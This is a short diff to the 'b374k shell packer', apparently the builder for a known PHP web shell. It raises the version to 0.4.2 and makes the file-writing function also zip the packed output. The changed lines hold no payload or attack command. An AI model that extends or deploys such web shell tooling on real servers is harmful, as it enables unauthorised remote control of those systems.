@@ -7,7 +7,7 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.4.1";
+$GLOBALS['packer']['version'] = "0.4.2";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -389,7 +389,18 @@ function packer_read_file($file){
 
 function packer_write_file($file, $content){
 	if($fh = @fopen($file, "wb")){
-		if(fwrite($fh, $content)!==false) return true;
+		if(fwrite($fh, $content)!==false){
+			if(!class_exists("ZipArchive")) return true;
+			
+			if(file_exists($file.".zip")) unlink ($file.".zip");
+			$zip = new ZipArchive();
+			$filename = "./".$file.".zip";
+
+			if($zip->open($filename, ZipArchive::CREATE)!==TRUE) return false;
+			$zip->addFile($file);
+			$zip->close();
+			return true;
+		}
 	}
 	return false;
 }
